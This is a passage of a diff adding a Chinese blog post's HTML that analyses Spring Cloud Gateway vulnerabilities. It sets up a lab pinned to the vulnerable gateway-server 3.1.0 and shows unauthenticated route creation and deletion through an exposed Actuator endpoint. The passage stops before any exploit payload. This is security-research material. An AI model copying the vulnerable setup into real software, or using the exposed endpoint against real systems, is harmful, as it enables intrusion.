@@ -1,0 +1,898 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xzq1_64x64.png">
+  <link rel="icon" href="/img/xzq1_64x64.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lingx5">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SpringCloud GateWay 漏洞分析简介Spring Cloud 官方文档 Spring Cloud 是一套基于 Spring Boot 的云原生分布式系统开发工具包。它解决了常见的分布式系统关键问题，如服务注册与发现、配置管理、服务容错、智能路由、消息驱动等。 他的组件有很多，其中就包括 SpringCloudGateWay。他是 SpringCloud 的下一代 API 网关，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpringCloud GateWay 漏洞分析">
+<meta property="og:url" content="http://lingx5.github.io/2025/05/15/SpringCloud-GateWay-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="lingx5的博客">
+<meta property="og:description" content="SpringCloud GateWay 漏洞分析简介Spring Cloud 官方文档 Spring Cloud 是一套基于 Spring Boot 的云原生分布式系统开发工具包。它解决了常见的分布式系统关键问题，如服务注册与发现、配置管理、服务容错、智能路由、消息驱动等。 他的组件有很多，其中就包括 SpringCloudGateWay。他是 SpringCloud 的下一代 API 网关，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-05-14_15-02-17.gif">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514151324577.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514153450099.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514153918037.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514154047183.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514154915909.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514155159069.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514194040350.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514194221946.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514194939526.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514195700607.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514200641583.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514200510985.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514201250492.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514201501884.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514201619500.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514202157427.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514202327010.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514202452483.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514204313088.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514205514464.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514210756845.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514211949521.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514212029883.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514211640036.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514211726165.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250515091120946.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250515093544933.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250515093746834.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250515094034244.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514213853353.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250514213921125.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250515095144008.png">
+<meta property="article:published_time" content="2025-05-15T02:05:45.000Z">
+<meta property="article:modified_time" content="2025-05-15T02:06:12.598Z">
+<meta property="article:author" content="lingx5">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="Spring">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-05-14_15-02-17.gif">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SpringCloud GateWay 漏洞分析 - lingx5的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lingx5.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Q4th1PtYC02FHNKGV3QVJgNX-MdYXbMMI","app_key":"Y9vGCfdqm9u55ZBjM8ep8KDX","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-3-23","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lingx5的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SpringCloud GateWay 漏洞分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-15 10:05" pubdate>
+          2025年5月15日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SpringCloud GateWay 漏洞分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer" />
+
+<h1 id="SpringCloud-GateWay-漏洞分析"><a href="#SpringCloud-GateWay-漏洞分析" class="headerlink" title="SpringCloud GateWay 漏洞分析"></a>SpringCloud GateWay 漏洞分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a target="_blank" rel="noopener" href="https://spring.io/projects/spring-cloud">Spring Cloud 官方文档</a></p>
+<p>Spring Cloud 是一套基于 Spring Boot 的云原生分布式系统开发工具包。它解决了常见的分布式系统关键问题，如服务注册与发现、配置管理、服务容错、智能路由、消息驱动等。</p>
+<p>他的组件有很多，其中就包括 SpringCloudGateWay。他是 SpringCloud 的下一代 API 网关，主要用于替换传统的 Zuul 1.x。他基于 Spring WebFlux，具有高性能和良好的可扩展性。</p>
+<h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><ul>
+<li>Route（路由）：这是 Spring Cloud Gateway 的基本构建块。由一个 ID，一个目标 URI，一组断言和一组过滤器定义。若请求与断言匹配成功，则将请求转发到对应服务。</li>
+<li>Predicate（断言）：Predicate 来源于 Java 8，是路由转发的判断条件。用于匹配来自 HTTP 请求的任何内容，例如：请求头、正文参数、请求路径等。</li>
+<li>Filter（过滤器）：这是 org.springframework.cloud.gateway.filter.GatewayFilter 类的实例，用于拦截请求并进行修改，还可以服务返回的响应进行再处理。</li>
+</ul>
+<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p>首先客户端向 Spring Cloud Gateway 发出请求。接着在 Gateway Handler Mapping 中进行路由匹配，匹配成功后将其发送到 Gateway Web Handler。Handler 再通过指定的过滤器链来将请求发送到对应的服务执行业务逻辑，然后返回结果。</p>
+<h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><p>我们先来看一下 SpringCloud GateWay 在代码中的使用</p>
+<p>创建一个普通的 springboot 项目，修改 springboot 版本并加入</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2021.0.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>pom<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>import<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencyManagement</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!--        有漏洞底层包版本--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-gateway-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>要把 springboot 的 <code>spring-boot-starter-web</code> 删除掉</p>
+</blockquote>
+<h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p>通过  .yml 配置文件进行配置网关</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">Gateway</span><br><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-attr">routes:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">&quot;test1&quot;</span><br>          <span class="hljs-attr">uri:</span> <span class="hljs-string">&quot;http://www.baidu.com/&quot;</span><br>          <span class="hljs-attr">predicates:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/</span><br>          <span class="hljs-attr">filters:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">AddResponseHeader=Result,1</span><br></code></pre></td></tr></table></figure>
+
+<p>各字段含义如下：</p>
+<ul>
+<li>id：我们自定义的路由 ID，保持唯一</li>
+<li>uri：目标服务地址</li>
+<li>predicates：路由条件，Predicate 接受一个输入参数，返回一个布尔值结果。该接口包含多种默认方法来将 Predicate 组合成其他复杂的逻辑（比如：与，或，非）。</li>
+<li>filters：过滤规则，本示例暂时没用。</li>
+</ul>
+<p>做好如上配置后，启动项目，访问 <code>localhost:8080/</code> </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-05-14_15-02-17.gif" srcset="/img/loading.gif" lazyload alt="PixPin_2025-05-14_15-02-17"></p>
+<p>看到直接就跳转到了百度的网页，这正是网关的作用</p>
+<h3 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h3><p>除了可以用 .yml 配置文件配置路由，我们还可以使用 Actuator（spring 监控组件）动态配置路由。</p>
+<p>添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>同时配置文件也要开启 gateway 监控 （Spring Boot 2.x 后为了安全起见默认只开放 &#x2F;actuator&#x2F;health 和 &#x2F;actuator&#x2F;info 端点）</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoint:</span><br>    <span class="hljs-attr">gateway:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">endpoints:</span><br>    <span class="hljs-attr">web:</span><br>      <span class="hljs-attr">exposure:</span><br>        <span class="hljs-attr">include:</span> <span class="hljs-string">gateway</span><br></code></pre></td></tr></table></figure>
+
+<p>访问 <code>http://localhost:8080/actuator/gateway/routes</code> 可以看到我们配置的 GateWay</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514151324577.png" srcset="/img/loading.gif" lazyload alt="image-20250514151324577" style="zoom:67%;" />
+
+<p><strong>添加路由</strong></p>
+<p>我们可以发送 POST 请求 <code>/actuator/gateway/routes/&#123;id_route_to_create&#125;</code> 搭配 json 数据来动态的添加路由</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Dynamics&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;predicates&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Path&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gatewaytest&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://lingx5.github.io/&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>我这里用的 postman</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514153450099.png" srcset="/img/loading.gif" lazyload alt="image-20250514153450099" style="zoom:50%;" />
+
+<p>在发送 <code>http://localhost:8080/actuator/gateway/refresh</code> 刷新路由缓存</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514153918037.png" srcset="/img/loading.gif" lazyload alt="image-20250514153918037" style="zoom:50%;" />
+
+<p>接着在浏览器访问 <code>http://localhost:8080/actuator/gateway/routes</code> 查看路由信息，看到动态添加的路由信息</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514154047183.png" srcset="/img/loading.gif" lazyload alt="image-20250514154047183" style="zoom:50%;" />
+
+<p>访问一下看看 <code>http://localhost:8080/lingx5</code> 发现他会跳转到 <code>https://lingx5.github.io/lingx5</code> 页面不存在，这是由于 Spring Cloud Gateway &#x3D;&#x3D;默认保留匹配路径&#x3D;&#x3D; 转发给后端，也就是前端 <code>/9224</code>，后端也收到 <code>/9224</code> 这个 path。要避免这种情况，我们需要使用 RewritePath 修正路径。</p>
+<p>修改后的 JSON</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Dynamics&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;predicates&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Path&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;filters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gatewaytest&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;RewritePath&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;_genkey_0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/lingx5&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;_genkey_1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://lingx5.github.io/&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以发送 Delete 请求到 <code>/gateway/routes/&#123;id_route_to_delete&#125;</code> 来删除路由</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250514154915909.png" srcset="/img/loading.gif" lazyload alt="image-20250514154915909" style="zoom:50%;" />
+
